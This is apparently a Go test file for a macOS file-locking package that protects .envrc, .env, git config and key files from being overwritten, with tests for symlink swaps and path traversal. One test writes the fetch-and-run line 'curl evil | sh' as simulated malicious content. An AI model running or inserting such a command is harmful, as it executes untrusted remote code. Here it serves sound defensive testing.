//go:build darwin

package hostlock

import (
	"io/fs"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// project creates files (relative path to content) in a new directory and
// returns its resolved path. Every flag is cleared when the test ends, so
// the directory can be removed.
func project(t *testing.T, files map[string]string) string {
	t.Helper()
	dir, err := filepath.EvalSymlinks(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		filepath.WalkDir(dir, func(path string, d fs.DirEntry, err error) error {
			if info, err := os.Lstat(path); err == nil && locked(info) {
				setLocked(path, info, false)
			}
			return nil
		})
	})
	for rel, content := range files {
		path := filepath.Join(dir, rel)
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

func isLocked(t *testing.T, path string) bool {
	t.Helper()
	info, err := os.Lstat(path)
	if err != nil {
		t.Fatal(err)
	}
	return locked(info)
}

func TestLockAndUnlock(t *testing.T) {
	dir := project(t, map[string]string{".envrc": "use flake\n", ".git/config": "", "config/.env": "KEY=1\n"})
	list := filepath.Join(t.TempDir(), "locks")
	n, failed, err := Lock(dir, []string{".envrc", ".git/config", "config/.env"}, list)
	if err != nil || n != 3 || len(failed) > 0 {
		t.Fatalf("Lock = %d, %v, %v; want 3", n, failed, err)
	}
	for _, rel := range []string{".envrc", ".git/config", "config/.env"} {
		path := filepath.Join(dir, rel)
		if !isLocked(t, path) {
			t.Errorf("%s not locked", rel)
		}
	}
	// What a host tool does to save a file: write a new one, rename it over.
	tmp := filepath.Join(dir, ".envrc.tmp")
	if err := os.WriteFile(tmp, []byte("curl evil | sh\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Rename(tmp, filepath.Join(dir, ".envrc")); err == nil || !strings.Contains(err.Error(), "operation not permitted") {
		t.Errorf("rename over a locked file = %v, want operation not permitted", err)
	}
	if err := os.Remove(filepath.Join(dir, "config/.env")); err == nil {
		t.Error("removed a locked file")
	}
	if err := Unlock(list); err != nil {
		t.Fatal(err)
	}
	for _, rel := range []string{".envrc", ".git/config", "config/.env"} {
		if isLocked(t, filepath.Join(dir, rel)) {
			t.Errorf("%s still locked", rel)
		}
	}
	if _, err := os.Lstat(list); !os.IsNotExist(err) {
		t.Errorf("lock list left: %v", err)
	}
	if err := Unlock(list); err != nil {
		t.Errorf("Unlock without a list = %v", err)
	}
}

// A secret the user can't read is locked and unlocked all the same.
func TestLockUnreadable(t *testing.T) {
	dir := project(t, map[string]string{"id_ed25519": "key"})
	key := filepath.Join(dir, "id_ed25519")
	if err := os.Chmod(key, 0); err != nil {
		t.Fatal(err)
	}
	list := filepath.Join(t.TempDir(), "locks")
	if n, failed, err := Lock(dir, []string{"id_ed25519"}, list); err != nil || n != 1 || len(failed) > 0 {
		t.Fatalf("Lock = %d, %v, %v; want 1", n, failed, err)
	}
	if !isLocked(t, key) {
		t.Error("not locked")
	}
	if err := Unlock(list); err != nil {
		t.Fatal(err)
	}
	if isLocked(t, key) {
		t.Error("still locked")
	}
}

// setLocked refuses a file that isn't the one checked: one swapped in by
// a rename, or a symlink.
func TestSetLockedRefusesSwappedFile(t *testing.T) {
	dir := project(t, map[string]string{".envrc": "a", "other": "b", "outside": "c"})
	envrc := filepath.Join(dir, ".envrc")
	info, err := os.Lstat(envrc)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.Rename(filepath.Join(dir, "other"), envrc); err != nil {
		t.Fatal(err)
	}
	if err := setLocked(envrc, info, true); err == nil || isLocked(t, envrc) {
		t.Errorf("locked a swapped-in file: %v", err)
	}
	if err := os.Remove(envrc); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join(dir, "outside"), envrc); err != nil {
		t.Fatal(err)
	}
	if err := setLocked(envrc, info, true); err == nil || isLocked(t, filepath.Join(dir, "outside")) {
		t.Errorf("locked through a symlink: %v", err)
	}
}

func TestLockRefusesLeftoverList(t *testing.T) {
	dir := project(t, map[string]string{".envrc": ""})
	list := filepath.Join(t.TempDir(), "locks")
	if err := os.WriteFile(list, nil, 0o600); err != nil {
		t.Fatal(err)
	}
	if _, _, err := Lock(dir, []string{".envrc"}, list); err == nil {
		t.Fatal("Lock over a leftover list succeeded")
	}
	if isLocked(t, filepath.Join(dir, ".envrc")) {
		t.Error(".envrc locked")
	}
}

// A file the user locked stays locked: it isn't listed, so Unlock leaves it.
func TestUserLockKept(t *testing.T) {
	dir := project(t, map[string]string{".env": "KEY=1\n", ".envrc": ""})
	env := filepath.Join(dir, ".env")
	info, err := os.Lstat(env)
	if err != nil {
		t.Fatal(err)
	}
	if err := setLocked(env, info, true); err != nil {
		t.Fatal(err)
	}
	list := filepath.Join(t.TempDir(), "locks")
	if n, failed, err := Lock(dir, []string{".env", ".envrc"}, list); err != nil || n != 1 || len(failed) > 0 {
		t.Fatalf("Lock = %d, %v, %v; want 1", n, failed, err)
	}
	if data, _ := os.ReadFile(list); strings.Contains(string(data), `".env"`) {
		t.Errorf("the user's lock is listed:\n%s", data)
	}
	if err := Unlock(list); err != nil {
		t.Fatal(err)
	}
	if !isLocked(t, env) {
		t.Error("the user's lock was cleared")
	}
}

// Only regular files inside the project are locked: not symlinks, files
// reached through one, directories, missing paths or paths outside.
func TestLockOnlyRegularFilesInside(t *testing.T) {
	outside := project(t, map[string]string{"secret": "x", "dir/file": "x"})
	dir := project(t, map[string]string{".envrc": "", ".git/hooks/pre-commit": ""})
	for link, target := range map[string]string{"link": filepath.Join(outside, "secret"), "linkdir": filepath.Join(outside, "dir")} {
		if err := os.Symlink(target, filepath.Join(dir, link)); err != nil {
			t.Fatal(err)
		}
	}
	list := filepath.Join(t.TempDir(), "locks")
	rels := []string{"link", "linkdir/file", ".git/hooks", "missing", "../" + filepath.Base(outside) + "/secret", outside + "/secret", "./.envrc", ".envrc"}
	n, failed, err := Lock(dir, rels, list)
	if err != nil || n != 1 || len(failed) > 0 {
		t.Fatalf("Lock = %d, %v, %v; want only .envrc", n, failed, err)
	}
	for _, path := range []string{filepath.Join(outside, "secret"), filepath.Join(outside, "dir/file"), filepath.Join(dir, ".git/hooks")} {
		if isLocked(t, path) {
			t.Errorf("%s locked", path)
		}
	}
	if err := Unlock(list); err != nil {
		t.Fatal(err)
	}
}

// Unlock checks each entry again: one that was turned into a symlink, or
// edited to point elsewhere, is skipped.
func TestUnlockSkipsChangedEntries(t *testing.T) {
	outside := project(t, map[string]string{"locked": "x", "dir/locked": "x"})
	for _, rel := range []string{"locked", "dir/locked"} {
		path := filepath.Join(outside, rel)
		info, _ := os.Lstat(path)
		if err := setLocked(path, info, true); err != nil {
			t.Fatal(err)
		}
	}
	dir := project(t, map[string]string{".envrc": "", "sub/.env": ""})
	list := filepath.Join(t.TempDir(), "locks")
	if _, _, err := Lock(dir, []string{".envrc", "sub/.env"}, list); err != nil {
		t.Fatal(err)
	}
	// sub is renamed away and replaced with a symlink, as a host tool might.
	if err := os.Rename(filepath.Join(dir, "sub"), filepath.Join(dir, "sub.old")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join(outside, "dir"), filepath.Join(dir, "sub")); err != nil {
		t.Fatal(err)
	}
	f, err := os.OpenFile(list, os.O_WRONLY|os.O_APPEND, 0)
	if err != nil {
		t.Fatal(err)
	}
	f.WriteString(`"../` + filepath.Base(outside) + `/locked"` + "\n" + `"` + outside + `/locked"` + "\nnot json\n")
	f.Close()
	if err := Unlock(list); err != nil {
		t.Fatal(err)
	}
	for _, path := range []string{filepath.Join(outside, "locked"), filepath.Join(outside, "dir/locked"), filepath.Join(dir, "sub.old/.env")} {
		if !isLocked(t, path) {
			t.Errorf("%s unlocked through a changed entry", path)
		}
	}
	if isLocked(t, filepath.Join(dir, ".envrc")) {
		t.Error(".envrc still locked")
	}
}
